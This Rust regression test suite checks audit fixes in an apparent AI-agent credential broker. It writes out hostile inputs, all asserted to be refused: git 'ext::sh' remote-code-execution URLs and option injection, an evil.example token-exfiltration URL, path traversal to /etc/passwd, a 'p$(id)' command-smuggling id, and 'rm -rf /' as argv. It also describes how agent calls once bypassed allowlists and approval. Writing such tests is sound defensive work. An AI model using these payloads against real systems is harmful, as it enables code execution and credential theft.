//! Adversarial security regression suite — external audit by Salva Ferrer
//! (avtn.es), ISSUE-KVD-CLI-B78ED5, remediated in v0.6.4.
//!
//! Each test is an ATTACK executed against the real broker surface in a
//! throwaway `~/.kvendra/`-shaped sandbox (tempdir, fast Argon2id params, no
//! real credentials, no network for the deny paths). Every test asserts the
//! v0.6.4 fix now REFUSES the attack that pre-0.6.4 let through:
//!
//!   C1  empty profile_id bypassed allowlist + approval          -> denied
//!   C2  shell `binaries:` inert (enforcer read `bin`, not
//!       `binary`) so any binary ran                             -> denied
//!   C4  profile with secret + no allowlist was fail-OPEN        -> denied
//!   H2  destructive predicates read the wrong nesting level so
//!       `s3 sync --delete` / `git tag --force` / mutating HTTP
//!       were seen as non-destructive (no approval prompt)       -> destructive
//!   H4  `unsafe_max_uses_per_session` declared but never read   -> enforced
//!   H5  `git clone ext::sh -c …` = RCE, leading `-` = option
//!       injection                                               -> rejected
//!   MED URL `url_pattern_regex` matched as a substring, so a
//!       hostile URL that merely contained the allowed host got
//!       the profile's Bearer token                              -> denied
//!
//! These tests are red on v0.6.3 (the attack succeeds) and green on v0.6.4.

use kvendra::allowlist::dsl::ProfileSpec;
use kvendra::allowlist::enforcer::check;
use kvendra::approval::policy::lookup_destructive;
use kvendra::approval::{ApprovalCache, ApprovalMode, Transport};
use kvendra::audit::AuditWriter;
use kvendra::config::Config;
use kvendra::error::KvendraError;
use kvendra::mcp::protocol::JsonRpcRequest;
use kvendra::mcp::server::{ServerContext, dispatch};
use kvendra::primitives::git::validate_git_url;
use kvendra::primitives::is_valid_profile_id;
use kvendra::vault::kdf::KdfParams;
use kvendra::vault::{Profile, Vault};
use serde_json::{Value, json};
use std::sync::Arc;
use tempfile::TempDir;
use tokio::sync::Mutex;

fn fast_params() -> KdfParams {
    KdfParams {
        m_cost_kib: 19_456,
        t_cost: 2,
        p_cost: 1,
        salt: vec![1u8; 16],
    }
}

/// Build a sandbox ServerContext. When `allowlist_yaml` is `Some`, the profile
/// gets a signed allowlist on disk; when `None`, the profile exists WITH a
/// secret but WITHOUT an allowlist (the C4 attack shape). Approval mode is
/// `Silent` so the dispatcher never reaches a TTY / biometric popup in CI.
async fn bootstrap(
    profile_id: &str,
    allowlist_yaml: Option<&str>,
    unsafe_enabled: bool,
) -> (TempDir, Arc<ServerContext>) {
    let dir = tempfile::tempdir().unwrap();
    let home = dir.path();
    kvendra::config::ensure_layout(home).unwrap();
    let v = Vault::new(home.to_path_buf());
    v.create_with_params(b"hunter2-salva-audit", fast_params())
        .unwrap();
    v.unlock(b"hunter2-salva-audit", 30).unwrap();
    v.put_secret(profile_id, b"ghp_notarealtokenjustplaceholder000000")
        .unwrap();
    v.save_profile_meta(&Profile {
        profile_id: profile_id.to_string(),
        secret_type: "github_pat".into(),
        created_at: "2026-09-15T00:00:00Z".into(),
        expiration: None,
        unsafe_raw_token_enabled: unsafe_enabled,
        quarantined: false,
        allowlist_hmac_hex: None,
    })
    .unwrap();

    if let Some(yaml) = allowlist_yaml {
        let allowlist_path = v.profile_allowlist_path(profile_id);
        std::fs::write(&allowlist_path, yaml).unwrap();
        let key = v.allowlist_hmac_key().unwrap();
        let hmac_hex = kvendra::vault::compute_allowlist_hmac(&key, yaml.as_bytes());
        let mut profile = v.load_profile_meta(profile_id).unwrap();
        profile.allowlist_hmac_hex = Some(hmac_hex);
        v.save_profile_meta(&profile).unwrap();
    }

    let writer = AuditWriter::spawn(v.audit_db_path(), v.audit_hmac_key().unwrap()).unwrap();
    let mut config = Config::default();
    config.approval.mode = ApprovalMode::Silent;

    let ctx = Arc::new(ServerContext {
        vault: v,
        config: std::sync::RwLock::new(config),
        writer: std::sync::RwLock::new(Some(writer)),
        approval_cache: Arc::new(ApprovalCache::new()),
        approval_prompt_lock: Arc::new(Mutex::new(())),
        transport: Transport::Mcp,
        resolver: None,
        session: None,
        workspace_id: None,
        unsafe_usage: Default::default(),
    });
    (dir, ctx)
}

fn call(name: &str, arguments: Value) -> JsonRpcRequest {
    JsonRpcRequest {
        jsonrpc: "2.0".into(),
        id: Some(json!(1)),
        method: "tools/call".into(),
        params: Some(json!({ "name": name, "arguments": arguments })),
    }
}

/// Drain the audit writer and collect `(primitive, flags, status)` rows.
async fn audit_rows(ctx: &Arc<ServerContext>) -> Vec<(String, String, String)> {
    if let Some(w) = ctx.audit_writer() {
        w.shutdown().await;
    }
    tokio::time::sleep(std::time::Duration::from_millis(60)).await;
    let conn = rusqlite::Connection::open(ctx.vault.audit_db_path()).unwrap();
    let mut stmt = conn
        .prepare("SELECT primitive, flags, status FROM audit_events ORDER BY id ASC")
        .unwrap();
    stmt.query_map([], |r| {
        Ok((
            r.get::<_, String>(0)?,
            r.get::<_, String>(1)?,
            r.get::<_, String>(2)?,
        ))
    })
    .unwrap()
    .filter_map(Result::ok)
    .collect()
}

// ─────────────────────────────────────────────────────────────────────────
// C1 — empty profile_id bypassed the allowlist AND the approval layer.
// Attack: run an arbitrary binary via kvendra.shell with no profile.
// ─────────────────────────────────────────────────────────────────────────

#[tokio::test]
async fn c1_empty_profile_id_shell_exec_is_denied() {
    let (_dir, ctx) = bootstrap("unused", Some(SHELL_ALLOWLIST), false).await;
    // Attacker sends NO profile_id, so pre-0.6.4 the allowlist + approval were
    // both skipped and this executed `/usr/bin/id`.
    let resp = dispatch(
        call(
            "kvendra.shell",
            json!({
                "profile_id": "",
                "operation": "exec",
                "args": { "binary": "id", "argv": [] }
            }),
        ),
        ctx.clone(),
    )
    .await;
    let err = resp
        .error
        .as_ref()
        .expect("empty profile_id must be denied");
    assert!(
        err.message.contains("non-empty profile_id"),
        "unexpected message: {}",
        err.message
    );
    let rows = audit_rows(&ctx).await;
    assert!(
        rows.iter()
            .any(|(_, flags, _)| flags.contains("empty_profile_denied")),
        "audit must carry empty_profile_denied; rows: {rows:?}"
    );
}

// ─────────────────────────────────────────────────────────────────────────
// C2 — the shell `binaries:` allowlist was inert (enforcer read `bin`, the
// primitive sends `binary`). Attack: run a binary outside the allowlist.
// ─────────────────────────────────────────────────────────────────────────

const SHELL_ALLOWLIST: &str = r#"
profile_id: shell.profile
secret:
  type: generic
allowlist:
  primitives:
    - name: kvendra.shell
      operations:
        - exec:
            binaries: ["echo"]
            accept_destructive: true
"#;

#[tokio::test]
async fn c2_shell_binary_outside_allowlist_is_denied() {
    let (_dir, ctx) = bootstrap("shell.profile", Some(SHELL_ALLOWLIST), false).await;
    // Only `echo` is allowlisted; the attacker asks for `id`.
    let resp = dispatch(
        call(
            "kvendra.shell",
            json!({
                "profile_id": "shell.profile",
                "operation": "exec",
                "args": { "binary": "id", "argv": [] }
            }),
        ),
        ctx.clone(),
    )
    .await;
    let err = resp
        .error
        .as_ref()
        .expect("binary outside allowlist must be denied");
    assert!(
        err.message.contains("binary 'id' not allowed"),
        "unexpected message: {}",
        err.message
    );
}

#[tokio::test]
async fn c2_enforcer_binaries_now_checks_binary_field() {
    // Enforcer-level: the constraint reads the SAME key the primitive emits.
    let spec = ProfileSpec::from_yaml(SHELL_ALLOWLIST).unwrap();
    let allowed = json!({
        "profile_id": "shell.profile",
        "operation": "exec",
        "args": { "binary": "echo", "argv": ["hi"] }
    });
    assert!(check(&spec, "kvendra.shell", "exec", &allowed).is_ok());
    let denied = json!({
        "profile_id": "shell.profile",
        "operation": "exec",
        "args": { "binary": "rm", "argv": ["-rf", "/"] }
    });
    assert!(matches!(
        check(&spec, "kvendra.shell", "exec", &denied),
        Err(KvendraError::AllowlistViolation(_))
    ));
    // Fail-closed: constraint declared but no `binary` field (the historical
    // `bin` typo shape) must be denied, not allowed.
    let shape_mismatch = json!({
        "profile_id": "shell.profile",
        "operation": "exec",
        "args": { "bin": "rm", "argv": [] }
    });
    assert!(check(&spec, "kvendra.shell", "exec", &shape_mismatch).is_err());
}

// ─────────────────────────────────────────────────────────────────────────
// C4 — a profile with a secret but no allowlist YAML was fail-open.
// ─────────────────────────────────────────────────────────────────────────

#[tokio::test]
async fn c4_profile_without_allowlist_is_denied() {
    let (_dir, ctx) = bootstrap("no.allowlist.profile", None, false).await;
    let resp = dispatch(
        call(
            "kvendra.github",
            json!({
                "profile_id": "no.allowlist.profile",
                "operation": "read_repo",
                "args": { "repo": "KvendraAI/kvendra-cli" }
            }),
        ),
        ctx.clone(),
    )
    .await;
    let err = resp
        .error
        .as_ref()
        .expect("no-allowlist profile must be denied");
    assert!(
        err.message.contains("no allowlist configured"),
        "unexpected message: {}",
        err.message
    );
    let rows = audit_rows(&ctx).await;
    assert!(
        rows.iter()
            .any(|(_, flags, _)| flags.contains("missing_allowlist_denied")),
        "audit must carry missing_allowlist_denied; rows: {rows:?}"
    );
}

// ─────────────────────────────────────────────────────────────────────────
// H2 — destructive-catalog predicates read the inner `args` payload now, so
// the mutating ops that pre-0.6.4 slipped past `ask-destructive` are flagged.
// ─────────────────────────────────────────────────────────────────────────

#[tokio::test]
async fn h2_mutating_ops_are_now_classified_destructive() {
    let spec = ProfileSpec::from_yaml(
        r#"
profile_id: t
secret:
  type: generic
allowlist:
  primitives:
    - name: kvendra.aws
      operations:
        - s3_sync:
            buckets: ["b"]
            accept_destructive: true
"#,
    )
    .unwrap();

    // The FIX: predicates receive the inner args payload.
    assert!(
        lookup_destructive(&spec, "kvendra.aws", "s3_sync", &json!({ "delete": true })),
        "s3 sync --delete must be destructive"
    );
    assert!(
        lookup_destructive(&spec, "kvendra.git", "tag", &json!({ "force": true })),
        "git tag --force must be destructive"
    );
    for verb in ["POST", "PUT", "PATCH", "DELETE"] {
        assert!(
            lookup_destructive(&spec, "kvendra.http", "request", &json!({ "method": verb })),
            "{verb} must be destructive"
        );
    }

    // The BUG shape: passing the whole envelope (fields one level too deep)
    // hides the mutating fields and reports non-destructive. This asserts the
    // regression we fixed by reading the inner payload in approval::check.
    // Re-authored on `git.tag` + `force` (ISSUE-KVD-CLI-9D5CF5 made `s3_sync`
    // destructive unconditionally, so it no longer has a predicate an
    // envelope-level read could hide); the H2 shape is the same.
    let envelope = json!({ "operation": "tag", "args": { "force": true } });
    assert!(
        !lookup_destructive(&spec, "kvendra.git", "tag", &envelope),
        "envelope-level read hides the force flag — this is exactly the H2 bug"
    );
}

// ─────────────────────────────────────────────────────────────────────────
// H4 — the escape-hatch per-session quota is now enforced.
// ─────────────────────────────────────────────────────────────────────────

const UNSAFE_ALLOWLIST: &str = r#"
profile_id: escape.hatch
secret:
  type: github_pat
allowlist:
  primitives:
    - name: kvendra.unsafe.raw_token
      unsafe_raw_token_allowed: true
      unsafe_max_uses_per_session: 1
"#;

#[tokio::test]
async fn h4_unsafe_raw_token_quota_is_enforced() {
    let (_dir, ctx) = bootstrap("escape.hatch", Some(UNSAFE_ALLOWLIST), true).await;
    let mk = || {
        call(
            "kvendra.unsafe.raw_token",
            json!({
                "profile_id": "escape.hatch",
                "operation": "get",
                "reason": "audit regression test for the per-session quota"
            }),
        )
    };
    // First use is within the budget of 1.
    let first = dispatch(mk(), ctx.clone()).await;
    assert!(
        first.error.is_none(),
        "first unsafe use must succeed: {:?}",
        first.error
    );
    // Second use exceeds it.
    let second = dispatch(mk(), ctx.clone()).await;
    let err = second
        .error
        .as_ref()
        .expect("second unsafe use must be denied");
    assert!(
        err.message.contains("quota exceeded"),
        "unexpected message: {}",
        err.message
    );
    let rows = audit_rows(&ctx).await;
    assert!(
        rows.iter()
            .any(|(_, flags, _)| flags.contains("unsafe_quota_exceeded")),
        "audit must carry unsafe_quota_exceeded; rows: {rows:?}"
    );
}

// ─────────────────────────────────────────────────────────────────────────
// H5 — git URL validation blocks ext:: RCE and option injection.
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn h5_git_url_validation_blocks_rce_and_option_injection() {
    // RCE via the ext remote helper.
    assert!(validate_git_url("ext::sh -c 'touch /tmp/pwned'").is_err());
    assert!(validate_git_url("ext::sh -c whoami").is_err());
    // Option injection via a leading dash.
    assert!(validate_git_url("--upload-pack=touch /tmp/pwned").is_err());
    assert!(validate_git_url("-oProxyCommand=id").is_err());
    // Other remote helpers.
    assert!(validate_git_url("fd::17").is_err());
    // Legitimate URLs still pass.
    assert!(validate_git_url("https://github.com/KvendraAI/kvendra-cli.git").is_ok());
    assert!(validate_git_url("http://internal.example/repo.git").is_ok());
    assert!(validate_git_url("ssh://git@github.com/KvendraAI/kvendra-cli.git").is_ok());
    assert!(validate_git_url("git@github.com:KvendraAI/kvendra-cli.git").is_ok());
    assert!(validate_git_url("git://example.org/repo.git").is_ok());
    // IPv6 literal is preserved (the `::` follows a scheme separator).
    assert!(validate_git_url("https://[::1]:8443/repo.git").is_ok());
}

// ─────────────────────────────────────────────────────────────────────────
// MED — URL allowlist regex is start-anchored, closing the substring bypass.
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn med_url_pattern_regex_is_anchored_against_substring_bypass() {
    let spec = ProfileSpec::from_yaml(
        r#"
profile_id: http.profile
secret:
  type: api_token
allowlist:
  primitives:
    - name: kvendra.http
      operations:
        - request:
            url_pattern_regex: ["https://api\\.github\\.com/"]
            methods: ["GET"]
            accept_destructive: true
"#,
    )
    .unwrap();

    // Legitimate call to the allowed host still works.
    let legit = json!({
        "profile_id": "http.profile",
        "operation": "request",
        "args": { "url": "https://api.github.com/repos/KvendraAI/kvendra-cli", "method": "GET" }
    });
    assert!(check(&spec, "kvendra.http", "request", &legit).is_ok());

    // Exfiltration bypass: hostile host that merely CONTAINS the allowed URL.
    // Pre-0.6.4 the substring `is_match` allowed this, leaking the Bearer to
    // evil.example.
    let bypass = json!({
        "profile_id": "http.profile",
        "operation": "request",
        "args": {
            "url": "https://evil.example/collect?x=https://api.github.com/",
            "method": "GET"
        }
    });
    assert!(
        matches!(
            check(&spec, "kvendra.http", "request", &bypass),
            Err(KvendraError::AllowlistViolation(_))
        ),
        "substring-bypass URL must be denied by the anchored matcher"
    );
}

// ─────────────────────────────────────────────────────────────────────────
// CYCLE 2 (beyond the external audit) — an agent-supplied profile_id is
// interpolated into vault filesystem paths, so `/` or `..` was a traversal
// vector. The dispatcher now validates it before building any path.
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn cycle2_profile_id_charset_is_validated() {
    assert!(is_valid_profile_id("github.kvendraai.cli-write"));
    assert!(is_valid_profile_id("aws.kvendra.staging-deploy"));
    assert!(is_valid_profile_id("p1_test-2"));
    // Traversal / injection shapes.
    assert!(!is_valid_profile_id(""));
    assert!(!is_valid_profile_id("../../etc/passwd"));
    assert!(!is_valid_profile_id("a/b"));
    assert!(!is_valid_profile_id("..")); // rejected by the `..` guard
    assert!(!is_valid_profile_id("a b"));
    assert!(!is_valid_profile_id("p\n"));
    assert!(!is_valid_profile_id("p$(id)"));
}

#[tokio::test]
async fn cycle2_traversal_profile_id_is_denied_by_dispatcher() {
    // A profile with a valid allowlist exists, but the attacker asks for a
    // traversal id. The dispatcher must reject on charset BEFORE touching disk.
    let (_dir, ctx) = bootstrap("legit.profile", Some(SHELL_ALLOWLIST), false).await;
    let resp = dispatch(
        call(
            "kvendra.github",
            json!({
                "profile_id": "../../../../etc/passwd",
                "operation": "read_repo",
                "args": { "repo": "KvendraAI/kvendra-cli" }
            }),
        ),
        ctx.clone(),
    )
    .await;
    let err = resp
        .error
        .as_ref()
        .expect("traversal profile_id must be denied");
    assert!(
        err.message.contains("outside [A-Za-z0-9._-]"),
        "unexpected message: {}",
        err.message
    );
    let rows = audit_rows(&ctx).await;
    assert!(
        rows.iter()
            .any(|(_, flags, _)| flags.contains("invalid_profile_denied")),
        "audit must carry invalid_profile_denied; rows: {rows:?}"
    );
}

// ─────────────────────────────────────────────────────────────────────────
// S1b (pentest) — an allowlist YAML is only bound to the profile_id it
// DECLARES; a same-uid attacker could copy profile A's allowlist (+ its valid
// HMAC) into profile B's slots to widen B. The enforcer now rejects a spec
// whose declared profile_id differs from the profile it is used for.
// ─────────────────────────────────────────────────────────────────────────

#[tokio::test]
async fn s1b_allowlist_bound_to_profile_id() {
    // The signed allowlist declares `profile_id: shell.profile`, but it is
    // installed under a DIFFERENT profile ("swapped.victim") — the swap shape.
    let (_dir, ctx) = bootstrap("swapped.victim", Some(SHELL_ALLOWLIST), false).await;
    let resp = dispatch(
        call(
            "kvendra.shell",
            json!({
                "profile_id": "swapped.victim",
                "operation": "exec",
                "args": { "binary": "echo", "argv": ["hi"] }
            }),
        ),
        ctx.clone(),
    )
    .await;
    let err = resp
        .error
        .as_ref()
        .expect("a profile_id-mismatched allowlist must be refused");
    assert!(
        err.message.contains("tampered"),
        "unexpected message: {}",
        err.message
    );
    let rows = audit_rows(&ctx).await;
    assert!(
        rows.iter()
            .any(|(_, flags, _)| flags.contains("allowlist_tampered_detected")),
        "audit must carry allowlist_tampered_detected; rows: {rows:?}"
    );
}
